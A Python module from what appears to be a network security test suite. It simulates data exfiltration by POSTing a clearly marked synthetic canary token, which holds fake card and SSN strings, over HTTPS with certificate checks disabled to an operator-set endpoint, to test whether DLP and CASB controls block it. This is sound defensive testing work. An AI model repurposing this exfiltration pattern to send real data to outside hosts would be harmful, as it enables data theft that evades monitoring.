"""Family E — DLP: canary-token HTTPS POST to cloud/SaaS storage.

Uploads a SMALL, clearly-marked SYNTHETIC canary token to an endpoint you control
(canary_url — a Canarytokens / webhook.site / your bucket URL) over 443. Tests DLP
content inspection + CASB SaaS-egress control. If the POST is accepted, DLP did not
block the (marked) exfil — a finding; the canary callback also proves reach.

SAFE by design: synthetic marked data only (never real records), one small POST.
Config: canary_url. MITRE T1567.002 (Exfil to Cloud Storage).
"""
import ssl
import uuid
from urllib.parse import urlparse
from modules import _util as U

META = {
    "id": "dlp_canary_https",
    "name": "DLP Canary Exfil (HTTPS POST)",
    "category": "Exfiltration",
    "test_type": "attack_sim",
    "family": "E",
    "direction": "a2b",
    "added": True,
    "control": "DLP content inspection + CASB SaaS-egress control",
    "fix": "SD-WAN",
    "mitre": ["T1567.002"],
    "tactic": "Exfiltration",
    "cwe": ["CWE-200"],
    "requires": [],
    "ports": [],
    "success_regex": r"^EXFIL-OK",
    "blocked_regex": r"exfil blocked|not configured",
}

_TOKEN = ("MYGOVNET-USS-CANARY SYNTHETIC-NON-SENSITIVE MARKER "
          "AAAA-BBBB-CCCC 4111-1111-1111-1111 fakeSSN-000-00-0000 " + uuid.uuid4().hex)


def run(target, ctx):
    url = ctx.cfg("canary_url")
    out = ["# DLP canary HTTPS-POST test (Family E) — synthetic marked data only"]
    if not url:
        out.append(U.skip("canary_url not configured — set an endpoint you control "
                          "(Canarytokens / webhook.site / your bucket)."))
        return "\n".join(out)
    u = urlparse(url if "://" in url else "https://" + url)
    host, port = u.hostname, (u.port or 443)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    body = f"canary={_TOKEN}"
    req = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
           "User-Agent: MyGovNet-USS/dlp-canary\r\nContent-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}")
    try:
        raw = U.connect(host, port, ctx, timeout=10)
    except OSError as e:
        out.append(f"exfil blocked — cannot reach {host}:{port} ({e.__class__.__name__})")
        return "\n".join(out)
    try:
        c = ssl.create_default_context()
        c.check_hostname = False
        c.verify_mode = ssl.CERT_NONE
        with c.wrap_socket(raw, server_hostname=host) as tls:
            tls.sendall(req.encode())
            resp = tls.recv(256).decode(errors="replace")
        first = resp.splitlines()[0] if resp else "(no response)"
        out.append(f"POST {host}{path} — response: {first!r}")
        if resp.startswith("HTTP/"):
            out.append(f"EXFIL-OK — the marked canary was POSTed out over 443 and accepted "
                       f"({first}). [FINDING] DLP/CASB did not block the exfil; expect the "
                       "canary callback to confirm reach.")
        else:
            out.append("exfil blocked — no HTTP response (DLP/proxy may have dropped it)")
    except ssl.SSLError as e:
        out.append(f"exfil blocked — TLS error ({e.__class__.__name__}) "
                   "(possible TLS-inspection/DLP interception)")
    except Exception as e:
        out.append(f"exfil error: {e.__class__.__name__}: {e}")
    finally:
        try:
            raw.close()
        except Exception:
            pass
    return "\n".join(out)
